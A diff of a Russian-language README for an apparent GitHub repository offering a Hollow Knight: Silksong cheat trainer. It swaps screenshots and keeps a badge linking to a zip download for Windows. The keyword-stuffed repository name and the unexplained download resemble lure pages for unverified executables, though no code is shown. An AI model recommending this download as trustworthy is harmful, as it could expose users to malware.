@@ -2,10 +2,7 @@
 
 [![⬇️ Скачать трейнер](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge&logo=github)](https://github.com/saskiarose/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks/releases/download/Hollow-Knight-Silksong-Trainer%2B9-Trainer/Hollow-Knight-Silksong-Trainer+9-Trainer.zip) 
 
-<img width="646" height="730" alt="изображение" src="https://github.com/user-attachments/assets/dabd1c3d-dc9b-450a-88c9-048a7f593924" />
-<img width="649" height="727" alt="изображение" src="https://github.com/user-attachments/assets/92ce152e-bb64-4953-b32c-2a57d7bad552" />
-<img width="642" height="719" alt="изображение" src="https://github.com/user-attachments/assets/8812f40e-be94-46c7-8bc1-643af4b0ec78" />
-
+![photo_2025-09-04_20-01-18](https://github.com/user-attachments/assets/928b0d58-e982-4368-9e21-9e2b58b062c9)
 
 
 > ✅ Нажмите на кнопку выше, чтобы скачать последнюю версию трейнера Hollow Knight: Silksong (поддержка Windows 10/11).  
